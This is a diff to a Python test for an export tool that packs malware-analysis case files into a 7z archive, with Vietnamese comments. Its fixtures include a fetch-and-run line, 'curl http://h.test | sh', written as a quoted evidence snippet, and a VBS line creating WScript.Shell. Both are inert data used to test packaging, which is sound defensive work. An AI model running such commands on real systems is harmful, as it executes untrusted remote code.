@@ -6,8 +6,8 @@ import os, sys, json, shutil, hashlib, tempfile, subprocess
 SKILL = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 T = tempfile.mkdtemp(prefix='rea-export-')
 FAKE7Z = os.path.join(T, 'fake7z'); LIST = os.path.join(T, 'packed.json')
-open(FAKE7Z, 'w').write('#!/usr/bin/env python3\nimport sys, json\na = sys.argv[1:]; i = a.index("--")\n'
-                        f'json.dump(a[i + 1:], open({LIST!r}, "w")); open(a[i - 1], "wb").write(b"7z\\xbc\\xaf\\x27\\x1c")\n')
+open(FAKE7Z, 'w').write('#!/usr/bin/env python3\nimport sys, json\na = sys.argv[1:]; assert "-spd" in a and a[-1][0] == "@"\n'   # danh sách qua @file
+                        f'json.dump(open(a[-1][1:]).read().split(), open({LIST!r}, "w")); open(a[-2], "wb").write(b"7z\\xbc\\xaf\\x27\\x1c")\n')
 os.chmod(FAKE7Z, 0o700); os.environ['SEVENZ_BIN'] = FAKE7Z
 sys.path.insert(0, SKILL)
 import export  # noqa: E402
@@ -30,6 +30,10 @@ try:
     w(os.path.join(c, 'work', 'ghidra', 'p.gpr'), 'ghidra'); w(os.path.join(c, 'work', 'scripts', '.claude', 'x.json'), '{}')
     w(os.path.join(c, 'work', '.watch.lock'), '')
     w(os.path.join(c, 'work', 'runs', 'mixed.txt'), b'text ' * 20000 + b'\x00\x01MZ')                # text ở đầu, nhị phân phía sau: gói
+    w(os.path.join(c, 'work', 'runs', 'tool', 't', 'stage2.ps1'), 'Write-Host hi\n')                   # OUT_DIR của công cụ T1b: gói
+    w(os.path.join(c, 'work', 'runs', 'tool', 't.out'), 'config: host=h.test\n')                      # output của công cụ: chép rõ
+    w(os.path.join(c, 'work', 'runs', 'dec', 'decoded.vbs'), 'Set o = CreateObject("WScript.Shell")\n')   # script giải mã: gói
+    w(os.path.join(c, 'report', 'evidence', 'snip.txt'), 'curl http://h.test | sh\n')                  # trích dẫn trong evidence: chép rõ
     w(os.path.join(c, 'facts.jsonl'), json.dumps({'id': 's.ft', 'kind': 'filetype', 'value': 'ELF x86-64', 'src': 'S', 'evidence': 'report/evidence/e.txt#L1',
                                                   'status': 'active', 'verified_by': '', 'supersedes': '', 'stage': '', 'note': '', 'ts': '2026-01-01T00:00:00'}) + '\n')
     w(os.path.join(c, 'report', 'evidence', 'e.txt'), 'ELF x86-64\n')
@@ -41,12 +45,13 @@ try:
     assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note] and sorted(p for p, _ in info['sums']) == [sums, sums2], info
     assert info['ftype'] == 'ELF x86-64' and info['notes'][0]['sha'] == 'khớp' and info['notes'][0]['path'] == '/usr/lib/x', info['notes']
     P = sorted(json.load(open(LIST)))
-    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt']), P
+    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt', 'work/runs/tool/t/stage2.ps1', 'work/runs/dec/decoded.vbs']), P
     files = sorted(os.path.relpath(os.path.join(dp, n), d) for dp, _, ns in os.walk(d) for n in ns)
     assert not any(f.startswith(('work/sample', 'work/extract', 'work/ghidra')) or '.claude' in f or f.endswith(('snap_oep.bin', 'stage1.bin', '.watch.lock')) for f in files), files
     assert {'work/runs/triage.txt', 'facts.jsonl', 'report/evidence/e.txt', 'x.bin.md', 'x.bin.html', 'README.txt', 'MANIFEST.sha256', export.ZIP,
             'ghi_chu_thu_mau/U1/a/x.txt', 'ghi_chu_thu_mau/U1/a/SHA256SUMS', 'ghi_chu_thu_mau/U2/SHA256SUMS'} <= set(files), files
-    assert not any(f.endswith('x.log') for f in files), files
+    assert not any(f.endswith('x.log') for f in files) and {'work/runs/tool/t.out', 'report/evidence/snip.txt'} <= set(files), files
+    assert not os.path.exists(d + '.list'), 'file danh sách 7z phải bị xóa'
     first = open(os.path.join(d, 'README.txt'), encoding='utf-8').readline(); assert f'(sha256 {h})' in first and export.ours(d), first
     man = open(os.path.join(d, 'MANIFEST.sha256'), encoding='utf-8').read(); assert f'{h}  {export.ZIP}:work/sample/x.bin' in man, man
     md = open(os.path.join(d, 'x.bin.md'), encoding='utf-8').read()
